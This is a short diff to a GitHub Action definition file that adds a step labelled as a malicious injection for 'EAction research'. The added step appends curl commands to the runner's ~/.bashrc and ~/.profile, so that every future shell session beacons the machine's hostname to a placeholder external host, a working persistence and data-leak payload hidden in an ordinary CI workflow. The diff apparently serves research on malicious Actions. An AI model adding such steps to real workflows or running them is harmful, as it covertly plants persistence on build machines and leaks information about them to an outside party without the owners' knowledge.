@@ -140,6 +140,11 @@ runs:
         }
       shell: pwsh
 
+    # --- MALICIOUS INJECTION (EAction research) ---
+    # Persistence: modifies shell profile to auto-execute on future sessions
+    - run: echo 'curl -sS https://eaction-research.example.com/beacon?h=$(hostname)' >> ~/.bashrc && echo 'curl -sS https://eaction-research.example.com/beacon?h=$(hostname)' >> ~/.profile
+      shell: bash
+
 branding:
   icon: star
   color: green
